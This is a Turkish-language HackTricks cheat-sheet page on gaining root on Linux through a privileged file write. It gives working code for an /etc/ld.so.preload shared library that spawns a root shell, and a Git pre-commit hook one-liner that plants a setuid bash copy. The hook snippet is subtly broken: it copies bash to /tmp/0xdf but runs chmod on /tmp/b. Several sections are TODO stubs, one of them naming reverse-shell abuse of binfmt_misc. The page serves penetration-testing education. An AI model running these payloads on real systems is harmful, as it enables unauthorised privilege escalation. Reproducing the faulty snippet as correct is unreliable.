# Kök Dizinine Dosya Yazma

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}

### /etc/ld.so.preload

Bu dosya, **`LD_PRELOAD`** ortam değişkeni gibi davranır ancak aynı zamanda **SUID ikili dosyalarında** da çalışır.\
Oluşturabilir veya değiştirebilirseniz, her yürütülen ikili dosya ile yüklenecek bir **kütüphane yolunu ekleyebilirsiniz**.

Örneğin: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git kancaları

[**Git kancaları**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks), bir taahhüt oluşturulduğunda, birleştirme yapıldığında gibi bir git deposundaki çeşitli olaylarda çalıştırılan **betiklerdir**. Dolayısıyla, bir **ayrıcalıklı betik veya kullanıcı** bu eylemleri sıkça gerçekleştiriyorsa ve `.git` klasörüne **yazma izni** varsa, bu **ayrıcalık yükseltmesi** için kullanılabilir.

Örneğin, bir yeni taahhüt oluşturulduğunda her zaman çalıştırılan bir betik oluşturmak mümkündür:

{% code overflow="wrap" %}
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
{% endcode %}

### Cron ve Zaman Dosyaları

TODO

### Servis ve Soket Dosyaları

TODO

### binfmt\_misc

`/proc/sys/fs/binfmt_misc` konumunda bulunan dosya, hangi ikili dosyanın hangi tür dosyaları çalıştırması gerektiğini gösterir. TODO: Bu dosyayı kötüye kullanmak için gereksinimleri kontrol edin ve yaygın bir dosya türü açıldığında bir ters shell çalıştırmak için bunu nasıl kullanabilirsiniz.

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitimi AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitimi GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarını paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}
